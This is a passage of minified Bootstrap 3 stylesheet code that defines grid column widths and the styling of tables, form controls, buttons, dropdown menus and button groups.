(min-width:1200px){.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9{float:left}.col-lg-12{width:100%}.col-lg-11{width:91.66666667%}.col-lg-10{width:83.33333333%}.col-lg-9{width:75%}.col-lg-8{width:66.66666667%}.col-lg-7{width:58.33333333%}.col-lg-6{width:50%}.col-lg-5{width:41.66666667%}.col-lg-4{width:33.33333333%}.col-lg-3{width:25%}.col-lg-2{width:16.66666667%}.col-lg-1{width:8.33333333%}.col-lg-pull-12{right:100%}.col-lg-pull-11{right:91.66666667%}.col-lg-pull-10{right:83.33333333%}.col-lg-pull-9{right:75%}.col-lg-pull-8{right:66.66666667%}.col-lg-pull-7{right:58.33333333%}.col-lg-pull-6{right:50%}.col-lg-pull-5{right:41.66666667%}.col-lg-pull-4{right:33.33333333%}.col-lg-pull-3{right:25%}.col-lg-pull-2{right:16.66666667%}.col-lg-pull-1{right:8.33333333%}.col-lg-pull-0{right:auto}.col-lg-push-12{left:100%}.col-lg-push-11{left:91.66666667%}.col-lg-push-10{left:83.33333333%}.col-lg-push-9{left:75%}.col-lg-push-8{left:66.66666667%}.col-lg-push-7{left:58.33333333%}.col-lg-push-6{left:50%}.col-lg-push-5{left:41.66666667%}.col-lg-push-4{left:33.33333333%}.col-lg-push-3{left:25%}.col-lg-push-2{left:16.66666667%}.col-lg-push-1{left:8.33333333%}.col-lg-push-0{left:auto}.col-lg-offset-12{margin-left:100%}.col-lg-offset-11{margin-left:91.66666667%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-0{margin-left:0}}table{background-color:transparent}caption{padding-top:8px;padding-bottom:8px;color:#777;text-align:left}th{text-align:left}.table{width:100%;max-width:100%;margin-bottom:20px}.table>tbody>tr>td,.table>tbody>tr>th,.table>tfoot>tr>td,.table>tfoot>tr>th,.table>thead>tr>td,.table>thead>tr>th{padding:8px;line-height:1.42857143;vertical-align:top;border-top:1px solid #ddd}.table>thead>tr>th{vertical-align:bottom;border-bottom:2px solid #ddd}.table>caption+thead>tr:first-child>td,.table>caption+thead>tr:first-child>th,.table>colgroup+thead>tr:first-child>td,.table>colgroup+thead>tr:first-child>th,.table>thead:first-child>tr:first-child>td,.table>thead:first-child>tr:first-child>th{border-top:0}.table>tbody+tbody{border-top:2px solid #ddd}.table .table{background-color:#fff}.table-condensed>tbody>tr>td,.table-condensed>tbody>tr>th,.table-condensed>tfoot>tr>td,.table-condensed>tfoot>tr>th,.table-condensed>thead>tr>td,.table-condensed>thead>tr>th{padding:5px}.table-bordered{border:1px solid #ddd}.table-bordered>tbody>tr>td,.table-bordered>tbody>tr>th,.table-bordered>tfoot>tr>td,.table-bordered>tfoot>tr>th,.table-bordered>thead>tr>td,.table-bordered>thead>tr>th{border:1px solid #ddd}.table-bordered>thead>tr>td,.table-bordered>thead>tr>th{border-bottom-width:2px}.table-striped>tbody>tr:nth-child(odd){background-color:#f9f9f9}.table-hover>tbody>tr:hover{background-color:#f5f5f5}table col[class*=col-]{position:static;display:table-column;float:none}table td[class*=col-],table th[class*=col-]{position:static;display:table-cell;float:none}.table>tbody>tr.active>td,.table>tbody>tr.active>th,.table>tbody>tr>td.active,.table>tbody>tr>th.active,.table>tfoot>tr.active>td,.table>tfoot>tr.active>th,.table>tfoot>tr>td.active,.table>tfoot>tr>th.active,.table>thead>tr.active>td,.table>thead>tr.active>th,.table>thead>tr>td.active,.table>thead>tr>th.active{background-color:#f5f5f5}.table-hover>tbody>tr.active:hover>td,.table-hover>tbody>tr.active:hover>th,.table-hover>tbody>tr:hover>.active,.table-hover>tbody>tr>td.active:hover,.table-hover>tbody>tr>th.active:hover{background-color:#e8e8e8}.table>tbody>tr.success>td,.table>tbody>tr.success>th,.table>tbody>tr>td.success,.table>tbody>tr>th.success,.table>tfoot>tr.success>td,.table>tfoot>tr.success>th,.table>tfoot>tr>td.success,.table>tfoot>tr>th.success,.table>thead>tr.success>td,.table>thead>tr.success>th,.table>thead>tr>td.success,.table>thead>tr>th.success{background-color:#dff0d8}.table-hover>tbody>tr.success:hover>td,.table-hover>tbody>tr.success:hover>th,.table-hover>tbody>tr:hover>.success,.table-hover>tbody>tr>td.success:hover,.table-hover>tbody>tr>th.success:hover{background-color:#d0e9c6}.table>tbody>tr.info>td,.table>tbody>tr.info>th,.table>tbody>tr>td.info,.table>tbody>tr>th.info,.table>tfoot>tr.info>td,.table>tfoot>tr.info>th,.table>tfoot>tr>td.info,.table>tfoot>tr>th.info,.table>thead>tr.info>td,.table>thead>tr.info>th,.table>thead>tr>td.info,.table>thead>tr>th.info{background-color:#d9edf7}.table-hover>tbody>tr.info:hover>td,.table-hover>tbody>tr.info:hover>th,.table-hover>tbody>tr:hover>.info,.table-hover>tbody>tr>td.info:hover,.table-hover>tbody>tr>th.info:hover{background-color:#c4e3f3}.table>tbody>tr.warning>td,.table>tbody>tr.warning>th,.table>tbody>tr>td.warning,.table>tbody>tr>th.warning,.table>tfoot>tr.warning>td,.table>tfoot>tr.warning>th,.table>tfoot>tr>td.warning,.table>tfoot>tr>th.warning,.table>thead>tr.warning>td,.table>thead>tr.warning>th,.table>thead>tr>td.warning,.table>thead>tr>th.warning{background-color:#fcf8e3}.table-hover>tbody>tr.warning:hover>td,.table-hover>tbody>tr.warning:hover>th,.table-hover>tbody>tr:hover>.warning,.table-hover>tbody>tr>td.warning:hover,.table-hover>tbody>tr>th.warning:hover{background-color:#faf2cc}.table>tbody>tr.danger>td,.table>tbody>tr.danger>th,.table>tbody>tr>td.danger,.table>tbody>tr>th.danger,.table>tfoot>tr.danger>td,.table>tfoot>tr.danger>th,.table>tfoot>tr>td.danger,.table>tfoot>tr>th.danger,.table>thead>tr.danger>td,.table>thead>tr.danger>th,.table>thead>tr>td.danger,.table>thead>tr>th.danger{background-color:#f2dede}.table-hover>tbody>tr.danger:hover>td,.table-hover>tbody>tr.danger:hover>th,.table-hover>tbody>tr:hover>.danger,.table-hover>tbody>tr>td.danger:hover,.table-hover>tbody>tr>th.danger:hover{background-color:#ebcccc}.table-responsive{min-height:.01%;overflow-x:auto}@media screen and (max-width:767px){.table-responsive{width:100%;margin-bottom:15px;overflow-y:hidden;-ms-overflow-style:-ms-autohiding-scrollbar;border:1px solid #ddd}.table-responsive>.table{margin-bottom:0}.table-responsive>.table>tbody>tr>td,.table-responsive>.table>tbody>tr>th,.table-responsive>.table>tfoot>tr>td,.table-responsive>.table>tfoot>tr>th,.table-responsive>.table>thead>tr>td,.table-responsive>.table>thead>tr>th{white-space:nowrap}.table-responsive>.table-bordered{border:0}.table-responsive>.table-bordered>tbody>tr>td:first-child,.table-responsive>.table-bordered>tbody>tr>th:first-child,.table-responsive>.table-bordered>tfoot>tr>td:first-child,.table-responsive>.table-bordered>tfoot>tr>th:first-child,.table-responsive>.table-bordered>thead>tr>td:first-child,.table-responsive>.table-bordered>thead>tr>th:first-child{border-left:0}.table-responsive>.table-bordered>tbody>tr>td:last-child,.table-responsive>.table-bordered>tbody>tr>th:last-child,.table-responsive>.table-bordered>tfoot>tr>td:last-child,.table-responsive>.table-bordered>tfoot>tr>th:last-child,.table-responsive>.table-bordered>thead>tr>td:last-child,.table-responsive>.table-bordered>thead>tr>th:last-child{border-right:0}.table-responsive>.table-bordered>tbody>tr:last-child>td,.table-responsive>.table-bordered>tbody>tr:last-child>th,.table-responsive>.table-bordered>tfoot>tr:last-child>td,.table-responsive>.table-bordered>tfoot>tr:last-child>th{border-bottom:0}}fieldset{min-width:0;padding:0;margin:0;border:0}legend{display:block;width:100%;padding:0;margin-bottom:20px;font-size:21px;line-height:inherit;color:#333;border:0;border-bottom:1px solid #e5e5e5}label{display:inline-block;max-width:100%;margin-bottom:5px;font-weight:700}input[type=search]{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}input[type=checkbox],input[type=radio]{margin:4px 0 0;margin-top:1px\9;line-height:normal}input[type=file]{display:block}input[type=range]{display:block;width:100%}select[multiple],select[size]{height:auto}input[type=checkbox]:focus,input[type=file]:focus,input[type=radio]:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}output{display:block;padding-top:7px;font-size:14px;line-height:1.42857143;color:#555}.form-control{display:block;width:100%;height:34px;padding:6px 12px;font-size:14px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075);-webkit-transition:border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;-o-transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s}.form-control:focus{border-color:#66afe9;outline:0;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6);box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6)}.form-control::-moz-placeholder{color:#999;opacity:1}.form-control:-ms-input-placeholder{color:#999}.form-control::-webkit-input-placeholder{color:#999}.form-control[disabled],.form-control[readonly],fieldset[disabled] .form-control{cursor:not-allowed;background-color:#eee;opacity:1}textarea.form-control{height:auto}input[type=search]{-webkit-appearance:none}@media screen and (-webkit-min-device-pixel-ratio:0){input[type=date],input[type=datetime-local],input[type=month],input[type=time]{line-height:34px}input[type=date].input-sm,input[type=datetime-local].input-sm,input[type=month].input-sm,input[type=time].input-sm{line-height:30px}input[type=date].input-lg,input[type=datetime-local].input-lg,input[type=month].input-lg,input[type=time].input-lg{line-height:46px}}.form-group{margin-bottom:15px}.checkbox,.radio{position:relative;display:block;margin-top:10px;margin-bottom:10px}.checkbox label,.radio label{min-height:20px;padding-left:20px;margin-bottom:0;font-weight:400;cursor:pointer}.checkbox input[type=checkbox],.checkbox-inline input[type=checkbox],.radio input[type=radio],.radio-inline input[type=radio]{position:absolute;margin-top:4px\9;margin-left:-20px}.checkbox+.checkbox,.radio+.radio{margin-top:-5px}.checkbox-inline,.radio-inline{display:inline-block;padding-left:20px;margin-bottom:0;font-weight:400;vertical-align:middle;cursor:pointer}.checkbox-inline+.checkbox-inline,.radio-inline+.radio-inline{margin-top:0;margin-left:10px}fieldset[disabled] input[type=checkbox],fieldset[disabled] input[type=radio],input[type=checkbox].disabled,input[type=checkbox][disabled],input[type=radio].disabled,input[type=radio][disabled]{cursor:not-allowed}.checkbox-inline.disabled,.radio-inline.disabled,fieldset[disabled] .checkbox-inline,fieldset[disabled] .radio-inline{cursor:not-allowed}.checkbox.disabled label,.radio.disabled label,fieldset[disabled] .checkbox label,fieldset[disabled] .radio label{cursor:not-allowed}.form-control-static{padding-top:7px;padding-bottom:7px;margin-bottom:0}.form-control-static.input-lg,.form-control-static.input-sm{padding-right:0;padding-left:0}.form-group-sm .form-control,.input-sm{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}select.form-group-sm .form-control,select.input-sm{height:30px;line-height:30px}select[multiple].form-group-sm .form-control,select[multiple].input-sm,textarea.form-group-sm .form-control,textarea.input-sm{height:auto}.form-group-lg .form-control,.input-lg{height:46px;padding:10px 16px;font-size:18px;line-height:1.33;border-radius:6px}select.form-group-lg .form-control,select.input-lg{height:46px;line-height:46px}select[multiple].form-group-lg .form-control,select[multiple].input-lg,textarea.form-group-lg .form-control,textarea.input-lg{height:auto}.has-feedback{position:relative}.has-feedback .form-control{padding-right:42.5px}.form-control-feedback{position:absolute;top:0;right:0;z-index:2;display:block;width:34px;height:34px;line-height:34px;text-align:center;pointer-events:none}.input-lg+.form-control-feedback{width:46px;height:46px;line-height:46px}.input-sm+.form-control-feedback{width:30px;height:30px;line-height:30px}.has-success .checkbox,.has-success .checkbox-inline,.has-success .control-label,.has-success .help-block,.has-success .radio,.has-success .radio-inline,.has-success.checkbox label,.has-success.checkbox-inline label,.has-success.radio label,.has-success.radio-inline label{color:#3c763d}.has-success .form-control{border-color:#3c763d;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075)}.has-success .form-control:focus{border-color:#2b542c;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #67b168;box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #67b168}.has-success .input-group-addon{color:#3c763d;background-color:#dff0d8;border-color:#3c763d}.has-success .form-control-feedback{color:#3c763d}.has-warning .checkbox,.has-warning .checkbox-inline,.has-warning .control-label,.has-warning .help-block,.has-warning .radio,.has-warning .radio-inline,.has-warning.checkbox label,.has-warning.checkbox-inline label,.has-warning.radio label,.has-warning.radio-inline label{color:#8a6d3b}.has-warning .form-control{border-color:#8a6d3b;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075)}.has-warning .form-control:focus{border-color:#66512c;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #c0a16b;box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #c0a16b}.has-warning .input-group-addon{color:#8a6d3b;background-color:#fcf8e3;border-color:#8a6d3b}.has-warning .form-control-feedback{color:#8a6d3b}.has-error .checkbox,.has-error .checkbox-inline,.has-error .control-label,.has-error .help-block,.has-error .radio,.has-error .radio-inline,.has-error.checkbox label,.has-error.checkbox-inline label,.has-error.radio label,.has-error.radio-inline label{color:#a94442}.has-error .form-control{border-color:#a94442;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075)}.has-error .form-control:focus{border-color:#843534;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #ce8483;box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #ce8483}.has-error .input-group-addon{color:#a94442;background-color:#f2dede;border-color:#a94442}.has-error .form-control-feedback{color:#a94442}.has-feedback label~.form-control-feedback{top:25px}.has-feedback label.sr-only~.form-control-feedback{top:0}.help-block{display:block;margin-top:5px;margin-bottom:10px;color:#737373}@media (min-width:768px){.form-inline .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}.form-inline .form-control{display:inline-block;width:auto;vertical-align:middle}.form-inline .form-control-static{display:inline-block}.form-inline .input-group{display:inline-table;vertical-align:middle}.form-inline .input-group .form-control,.form-inline .input-group .input-group-addon,.form-inline .input-group .input-group-btn{width:auto}.form-inline .input-group>.form-control{width:100%}.form-inline .control-label{margin-bottom:0;vertical-align:middle}.form-inline .checkbox,.form-inline .radio{display:inline-block;margin-top:0;margin-bottom:0;vertical-align:middle}.form-inline .checkbox label,.form-inline .radio label{padding-left:0}.form-inline .checkbox input[type=checkbox],.form-inline .radio input[type=radio]{position:relative;margin-left:0}.form-inline .has-feedback .form-control-feedback{top:0}}.form-horizontal .checkbox,.form-horizontal .checkbox-inline,.form-horizontal .radio,.form-horizontal .radio-inline{padding-top:7px;margin-top:0;margin-bottom:0}.form-horizontal .checkbox,.form-horizontal .radio{min-height:27px}.form-horizontal .form-group{margin-right:-15px;margin-left:-15px}@media (min-width:768px){.form-horizontal .control-label{padding-top:7px;margin-bottom:0;text-align:right}}.form-horizontal .has-feedback .form-control-feedback{right:15px}@media (min-width:768px){.form-horizontal .form-group-lg .control-label{padding-top:14.3px}}@media (min-width:768px){.form-horizontal .form-group-sm .control-label{padding-top:6px}}.btn{display:inline-block;padding:6px 12px;margin-bottom:0;font-size:14px;font-weight:400;line-height:1.42857143;text-align:center;white-space:nowrap;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-image:none;border:1px solid transparent;border-radius:4px}.btn.active.focus,.btn.active:focus,.btn.focus,.btn:active.focus,.btn:active:focus,.btn:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn.focus,.btn:focus,.btn:hover{color:#333;text-decoration:none}.btn.active,.btn:active{background-image:none;outline:0;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.btn.disabled,.btn[disabled],fieldset[disabled] .btn{pointer-events:none;cursor:not-allowed;filter:alpha(opacity=65);-webkit-box-shadow:none;box-shadow:none;opacity:.65}.btn-default{color:#333;background-color:#fff;border-color:#ccc}.btn-default.active,.btn-default.focus,.btn-default:active,.btn-default:focus,.btn-default:hover,.open>.dropdown-toggle.btn-default{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default.active,.btn-default:active,.open>.dropdown-toggle.btn-default{background-image:none}.btn-default.disabled,.btn-default.disabled.active,.btn-default.disabled.focus,.btn-default.disabled:active,.btn-default.disabled:focus,.btn-default.disabled:hover,.btn-default[disabled],.btn-default[disabled].active,.btn-default[disabled].focus,.btn-default[disabled]:active,.btn-default[disabled]:focus,.btn-default[disabled]:hover,fieldset[disabled] .btn-default,fieldset[disabled] .btn-default.active,fieldset[disabled] .btn-default.focus,fieldset[disabled] .btn-default:active,fieldset[disabled] .btn-default:focus,fieldset[disabled] .btn-default:hover{background-color:#fff;border-color:#ccc}.btn-default .badge{color:#fff;background-color:#333}.btn-primary{color:#fff;background-color:#337ab7;border-color:#2e6da4}.btn-primary.active,.btn-primary.focus,.btn-primary:active,.btn-primary:focus,.btn-primary:hover,.open>.dropdown-toggle.btn-primary{color:#fff;background-color:#286090;border-color:#204d74}.btn-primary.active,.btn-primary:active,.open>.dropdown-toggle.btn-primary{background-image:none}.btn-primary.disabled,.btn-primary.disabled.active,.btn-primary.disabled.focus,.btn-primary.disabled:active,.btn-primary.disabled:focus,.btn-primary.disabled:hover,.btn-primary[disabled],.btn-primary[disabled].active,.btn-primary[disabled].focus,.btn-primary[disabled]:active,.btn-primary[disabled]:focus,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary,fieldset[disabled] .btn-primary.active,fieldset[disabled] .btn-primary.focus,fieldset[disabled] .btn-primary:active,fieldset[disabled] .btn-primary:focus,fieldset[disabled] .btn-primary:hover{background-color:#337ab7;border-color:#2e6da4}.btn-primary .badge{color:#337ab7;background-color:#fff}.btn-success{color:#fff;background-color:#5cb85c;border-color:#4cae4c}.btn-success.active,.btn-success.focus,.btn-success:active,.btn-success:focus,.btn-success:hover,.open>.dropdown-toggle.btn-success{color:#fff;background-color:#449d44;border-color:#398439}.btn-success.active,.btn-success:active,.open>.dropdown-toggle.btn-success{background-image:none}.btn-success.disabled,.btn-success.disabled.active,.btn-success.disabled.focus,.btn-success.disabled:active,.btn-success.disabled:focus,.btn-success.disabled:hover,.btn-success[disabled],.btn-success[disabled].active,.btn-success[disabled].focus,.btn-success[disabled]:active,.btn-success[disabled]:focus,.btn-success[disabled]:hover,fieldset[disabled] .btn-success,fieldset[disabled] .btn-success.active,fieldset[disabled] .btn-success.focus,fieldset[disabled] .btn-success:active,fieldset[disabled] .btn-success:focus,fieldset[disabled] .btn-success:hover{background-color:#5cb85c;border-color:#4cae4c}.btn-success .badge{color:#5cb85c;background-color:#fff}.btn-info{color:#fff;background-color:#5bc0de;border-color:#46b8da}.btn-info.active,.btn-info.focus,.btn-info:active,.btn-info:focus,.btn-info:hover,.open>.dropdown-toggle.btn-info{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info.active,.btn-info:active,.open>.dropdown-toggle.btn-info{background-image:none}.btn-info.disabled,.btn-info.disabled.active,.btn-info.disabled.focus,.btn-info.disabled:active,.btn-info.disabled:focus,.btn-info.disabled:hover,.btn-info[disabled],.btn-info[disabled].active,.btn-info[disabled].focus,.btn-info[disabled]:active,.btn-info[disabled]:focus,.btn-info[disabled]:hover,fieldset[disabled] .btn-info,fieldset[disabled] .btn-info.active,fieldset[disabled] .btn-info.focus,fieldset[disabled] .btn-info:active,fieldset[disabled] .btn-info:focus,fieldset[disabled] .btn-info:hover{background-color:#5bc0de;border-color:#46b8da}.btn-info .badge{color:#5bc0de;background-color:#fff}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning.active,.btn-warning.focus,.btn-warning:active,.btn-warning:focus,.btn-warning:hover,.open>.dropdown-toggle.btn-warning{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning.active,.btn-warning:active,.open>.dropdown-toggle.btn-warning{background-image:none}.btn-warning.disabled,.btn-warning.disabled.active,.btn-warning.disabled.focus,.btn-warning.disabled:active,.btn-warning.disabled:focus,.btn-warning.disabled:hover,.btn-warning[disabled],.btn-warning[disabled].active,.btn-warning[disabled].focus,.btn-warning[disabled]:active,.btn-warning[disabled]:focus,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning,fieldset[disabled] .btn-warning.active,fieldset[disabled] .btn-warning.focus,fieldset[disabled] .btn-warning:active,fieldset[disabled] .btn-warning:focus,fieldset[disabled] .btn-warning:hover{background-color:#f0ad4e;border-color:#eea236}.btn-warning .badge{color:#f0ad4e;background-color:#fff}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger.active,.btn-danger.focus,.btn-danger:active,.btn-danger:focus,.btn-danger:hover,.open>.dropdown-toggle.btn-danger{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger.active,.btn-danger:active,.open>.dropdown-toggle.btn-danger{background-image:none}.btn-danger.disabled,.btn-danger.disabled.active,.btn-danger.disabled.focus,.btn-danger.disabled:active,.btn-danger.disabled:focus,.btn-danger.disabled:hover,.btn-danger[disabled],.btn-danger[disabled].active,.btn-danger[disabled].focus,.btn-danger[disabled]:active,.btn-danger[disabled]:focus,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger,fieldset[disabled] .btn-danger.active,fieldset[disabled] .btn-danger.focus,fieldset[disabled] .btn-danger:active,fieldset[disabled] .btn-danger:focus,fieldset[disabled] .btn-danger:hover{background-color:#d9534f;border-color:#d43f3a}.btn-danger .badge{color:#d9534f;background-color:#fff}.btn-link{font-weight:400;color:#337ab7;border-radius:0}.btn-link,.btn-link.active,.btn-link:active,.btn-link[disabled],fieldset[disabled] .btn-link{background-color:transparent;-webkit-box-shadow:none;box-shadow:none}.btn-link,.btn-link:active,.btn-link:focus,.btn-link:hover{border-color:transparent}.btn-link:focus,.btn-link:hover{color:#23527c;text-decoration:underline;background-color:transparent}.btn-link[disabled]:focus,.btn-link[disabled]:hover,fieldset[disabled] .btn-link:focus,fieldset[disabled] .btn-link:hover{color:#777;text-decoration:none}.btn-group-lg>.btn,.btn-lg{padding:10px 16px;font-size:18px;line-height:1.33;border-radius:6px}.btn-group-sm>.btn,.btn-sm{padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}.btn-group-xs>.btn,.btn-xs{padding:1px 5px;font-size:12px;line-height:1.5;border-radius:3px}.btn-block{display:block;width:100%}.btn-block+.btn-block{margin-top:5px}input[type=button].btn-block,input[type=reset].btn-block,input[type=submit].btn-block{width:100%}.fade{opacity:0;-webkit-transition:opacity .15s linear;-o-transition:opacity .15s linear;transition:opacity .15s linear}.fade.in{opacity:1}.collapse{display:none;visibility:hidden}.collapse.in{display:block;visibility:visible}tr.collapse.in{display:table-row}tbody.collapse.in{display:table-row-group}.collapsing{position:relative;height:0;overflow:hidden;-webkit-transition-timing-function:ease;-o-transition-timing-function:ease;transition-timing-function:ease;-webkit-transition-duration:.35s;-o-transition-duration:.35s;transition-duration:.35s;-webkit-transition-property:height,visibility;-o-transition-property:height,visibility;transition-property:height,visibility}.caret{display:inline-block;width:0;height:0;margin-left:2px;vertical-align:middle;border-top:4px solid;border-right:4px solid transparent;border-left:4px solid transparent}.dropdown{position:relative}.dropdown-toggle:focus{outline:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;font-size:14px;text-align:left;list-style:none;background-color:#fff;-webkit-background-clip:padding-box;background-clip:padding-box;border:1px solid #ccc;border:1px solid rgba(0,0,0,.15);border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,.175);box-shadow:0 6px 12px rgba(0,0,0,.175)}.dropdown-menu.pull-right{right:0;left:auto}.dropdown-menu .divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}.dropdown-menu>li>a{display:block;padding:3px 20px;clear:both;font-weight:400;line-height:1.42857143;color:#333;white-space:nowrap}.dropdown-menu>li>a:focus,.dropdown-menu>li>a:hover{color:#262626;text-decoration:none;background-color:#f5f5f5}.dropdown-menu>.active>a,.dropdown-menu>.active>a:focus,.dropdown-menu>.active>a:hover{color:#fff;text-decoration:none;background-color:#337ab7;outline:0}.dropdown-menu>.disabled>a,.dropdown-menu>.disabled>a:focus,.dropdown-menu>.disabled>a:hover{color:#777}.dropdown-menu>.disabled>a:focus,.dropdown-menu>.disabled>a:hover{text-decoration:none;cursor:not-allowed;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled=false)}.open>.dropdown-menu{display:block}.open>a{outline:0}.dropdown-menu-right{right:0;left:auto}.dropdown-menu-left{right:auto;left:0}.dropdown-header{display:block;padding:3px 20px;font-size:12px;line-height:1.42857143;color:#777;white-space:nowrap}.dropdown-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;z-index:990}.pull-right>.dropdown-menu{right:0;left:auto}.dropup .caret,.navbar-fixed-bottom .dropdown .caret{content:"";border-top:0;border-bottom:4px solid}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:1px}@media (min-width:768px){.navbar-right .dropdown-menu{right:0;left:auto}.navbar-right .dropdown-menu-left{right:auto;left:0}}.btn-group,.btn-group-vertical{position:relative;display:inline-block;vertical-align:middle}.btn-group-vertical>.btn,.btn-group>.btn{position:relative;float:left}.btn-group-vertical>.btn.active,.btn-group-vertical>.btn:active,.btn-group-vertical>.btn:focus,.btn-group-vertical>.btn:hover,.btn-group>.btn.active,.btn-group>.btn:active,.btn-group>.btn:focus,.btn-group>.btn:hover{z-index:2}.btn-group .btn+.btn,.btn-group .btn+.btn-group,.btn-group .btn-group+.btn,.btn-group .btn-group+.btn-group{margin-left:-1px}.btn-toolbar{margin-left:-5px}.btn-toolbar .btn-group,.btn-toolbar .input-group{float:left}.btn-toolbar>.btn,.btn-toolbar>.btn-group,.btn-toolbar>.input-group{margin-left:5px}.btn-group>.btn:not(:first-child):not(:last-child):not(.dropdown-toggle){border-radius:0}.btn-group>.btn:first-child{margin-left:0}.btn-group>.btn:first-child:not(:last-child):not(.dropdown-toggle){border-top-right-radius:0;border-bottom-right-radius:0}.btn-group>.btn:last-child:not(:first-child),.btn-group>.dropdown-toggle:not(:first-child){border-top-left-radius:0;border-bottom-left-radius:0}.btn-group>.btn-group{float:left}.btn-group>.btn-group:not(:first-child):not(:last-child)>.btn{border-radius:0}.btn-group>.btn-group:first-child>.btn:last-child,.btn-group>.btn-group:first-child>.dropdown-toggle{border-top-right-radius:0;border-bottom-right-radius:0}.btn-group>.btn-group:last-child>.btn:first-child{border-top-left-radius:0;border-bottom-left-radius:0}.btn-group .dropdown-toggle:active,.btn-group.open .dropdown-toggle{outline:0}.btn-group>.btn+.dropdown-toggle{padding-right:8px;padding-left:8px}.btn-group>.btn-lg+.dropdown-toggle{padding-right:12px;padding-left:12px}.btn-group.open .dropdown-toggle{-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.btn-group.open .dropdown-toggle.btn-link{-webkit-box-shadow:none;box-shadow:none}.btn .caret{margin-left:0}.btn-lg .caret{border-width:5px 5px 0;border-bottom-width:0}.dropup .btn-lg .caret{border-width:0 5px 5px}.btn-group-vertical>.btn,.btn-group-vertical>.btn-group,.btn-group-vertical>.btn-group>.btn{display:block;float:none;width:100%;max-width:100%}.btn-group-vertical>.btn-group>.btn{float:none}.btn-group-vertical>.btn+.btn,.btn-group-vertical>.btn+.btn-group,.btn-group-vertical>.btn-group+.btn,.btn-group-vertical>.btn-group+.btn-group{margin-top:-1px;margin-left:0}.btn-group-vertical>.btn:not(:first-child):not(:last-child){border-radius:0}.btn-group-vertical>.btn:first-child:not(:last-child){border-top-right-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.btn-group-vertical>.btn:last-child:not(:first-child){border-top-left-radius:0;border-top-right-radius:0;border-bottom-left-radius:4px}.btn-group-vertical>.btn-group:not(:first-child):not(:last-child)>.btn{border-radius:0}.btn-group-vertical>.btn-group:first-child:not(:last-child)>.btn:last-child,.btn-group-vertical>.btn-group:first-child:not(:last-child)>.dropdown-toggle{border-bottom-right-radius:0;border-bottom-left-radius:0}.btn-group-vertical>.btn-group:last-child:not(:first-child)>.btn:first-child{border-top-left-radius:0;border-top-right-radius:0}.btn-group-justified{display:table;width:100%;table-layout:fixed;border-collapse:separate}.btn-group-justified>.btn,.btn-group-justified>.btn-group{display:table-cell;float:none;width:1%}.btn-group-justified>.btn-group .btn{width:100%}.btn-group-justified>.btn-group .dropdown-menu{left:auto}[data-toggle=buttons]>.btn input[type=checkbox],[data-toggle=buttons]>.btn input[type=radio],[data-toggle=buttons]>.btn-group>.btn input[type=checkbox],[data-toggle=buttons]>.btn-group>.btn 